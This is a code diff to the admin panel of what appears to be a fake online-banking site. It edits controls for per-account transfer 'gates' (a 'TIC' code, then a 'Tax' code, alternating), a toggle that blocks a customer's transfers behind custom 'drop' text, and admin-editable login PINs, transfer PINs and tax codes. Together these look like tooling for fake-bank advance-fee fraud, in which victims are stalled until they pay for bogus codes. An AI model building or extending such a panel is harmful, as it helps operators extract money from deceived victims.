@@ -761,10 +761,6 @@
                             onclick="toggleGateBtn('tax')">OFF</button>
                     </div>
                 </div>
-                <p style="font-size:12px;color:#666;margin:0 0 10px;">
-                    Classic FSW flow (server): <b>1st transfer → TIC 7766 → receipt</b>,
-                    <b>2nd → Tax 8659 → receipt</b>, then alternates. Reset count below to start at TIC again.
-                </p>
                 <button type="button" class="btn btn-ghost btn-block" id="resetTransferGateBtn"
                     style="margin-bottom:10px;">Reset count (next transfer treated as first)</button>
                 <style>
@@ -792,16 +788,36 @@
                 </style>
 
 
+
+                <div id="dropTextSection"
+                    style="margin:16px 0;padding:14px;border:1px solid #e2e8f0;border-radius:12px;background:#f8fafc;">
+                    <label style="font-weight:700;display:block;margin-bottom:6px;color:#071a52;">Drop your text (blocks
+                        transfers when ON)</label>
+                    <p style="font-size:12px;color:#666;margin:0 0 10px;">Per this account. When ON, local/international
+                        transfer shows this message and cannot continue. Edit the text, then Save drop text.</p>
+                    <textarea id="f_dropText" rows="5"
+                        style="width:100%;padding:10px;border-radius:8px;border:1px solid #cbd5e1;font-size:14px;box-sizing:border-box;line-height:1.45;"></textarea>
+                    <div style="display:flex;gap:10px;align-items:center;margin-top:10px;flex-wrap:wrap;">
+                        <button type="button" id="btnDropTextToggle" class="gate-btn off"
+                            onclick="toggleDropTextBtn()">OFF</button>
+                        <button type="button" class="btn btn-primary btn-sm" id="btnDropTextSave"
+                            style="padding:10px 16px;border-radius:8px;border:0;background:#071a52;color:#fff;font-weight:700;cursor:pointer;">Save
+                            drop text</button>
+                    </div>
+                    <p id="dropTextHint" style="font-size:12px;color:#166534;margin:8px 0 0;"></p>
+                </div>
+
                 <h3 style="margin:18px 0 10px;color:#071a52;font-size:15px;">Account PINs (this account only)</h3>
-                <p style="font-size:12.5px;color:#666;margin:0 0 10px;">Set from addmoreprofile — unique per account.
-                    Visible here when you switch accounts.</p>
+                <p style="font-size:12.5px;color:#666;margin:0 0 10px;">Per account — editable here. Click <b>Save
+                        changes</b> below to update this switched account (works on every device).</p>
                 <div class="field-row">
-                    <div class="field"><label>Login PIN</label><input type="text" id="f_loginPin" readonly
-                            style="background:#f0f4ff;font-weight:700;"></div>
-                    <div class="field"><label>Transfer PIN</label><input type="text" id="f_transferPin" readonly
-                            style="background:#f0f4ff;font-weight:700;"></div>
-                    <div class="field"><label>Tax code</label><input type="text" id="f_taxCodePin" readonly
-                            style="background:#f0f4ff;font-weight:700;"></div>
+                    <div class="field"><label>Login PIN</label><input type="text" id="f_loginPin" inputmode="numeric"
+                            maxlength="12" style="background:#fff;font-weight:700;border:1px solid #c5d4f0;"></div>
+                    <div class="field"><label>Transfer PIN</label><input type="text" id="f_transferPin"
+                            inputmode="numeric" maxlength="12"
+                            style="background:#fff;font-weight:700;border:1px solid #c5d4f0;"></div>
+                    <div class="field"><label>Tax code</label><input type="text" id="f_taxCodePin" inputmode="numeric"
+                            maxlength="12" style="background:#fff;font-weight:700;border:1px solid #c5d4f0;"></div>
                 </div>
 
                 <h3 style="margin:18px 0 10px;color:#071a52;font-size:15px;">Login for this account only</h3>
@@ -1335,7 +1351,7 @@
             const b = document.getElementById('btnDropTextToggle');
             if (b) { b.textContent = _dropTextOn ? 'ON' : 'OFF'; b.className = 'gate-btn ' + (_dropTextOn ? 'on' : 'off'); }
         }
-        document.getElementById('btnDropTextSave') && document.getElementById('btnDropTextSave').addEventListener('click', async function () {
+        async function saveDropTextNow() {
             if (!currentAdminUserId || String(currentAdminUserId).indexOf('+') !== -1) {
                 showToast('Select a valid account first');
                 return;
@@ -1350,6 +1366,12 @@
                 if (h) h.textContent = 'Saved — ' + (_dropTextOn ? 'ON (blocks transfers)' : 'OFF');
                 showToast('Drop text saved for this account');
             } catch (e) { showToast('Save failed: ' + e.message); }
+        }
+        document.addEventListener('click', function (ev) {
+            if (ev.target && (ev.target.id === 'btnDropTextSave' || (ev.target.closest && ev.target.closest('#btnDropTextSave')))) {
+                ev.preventDefault();
+                saveDropTextNow();
+            }
         });
 
         async function toggleGateBtn(which) {
@@ -1488,6 +1510,12 @@
                 updates.transferMode = 'tic_then_tax';
                 updates.transferPinEnabled = _gatePinOn;
                 updates.taxCodeEnabled = _gateTaxOn;
+                var lp = (document.getElementById('f_loginPin') || {}).value;
+                var tp = (document.getElementById('f_transferPin') || {}).value;
+                var tx = (document.getElementById('f_taxCodePin') || {}).value;
+                if (lp != null && String(lp).trim()) updates.loginPin = String(lp).trim();
+                if (tp != null && String(tp).trim()) updates.transferPin = String(tp).trim();
+                if (tx != null && String(tx).trim()) updates.taxCodePin = String(tx).trim();
                 await fswUpdateUser(currentAdminUserId, updates);
                 showToast('Saved');
                 if (btn) btn.textContent = 'Saved';
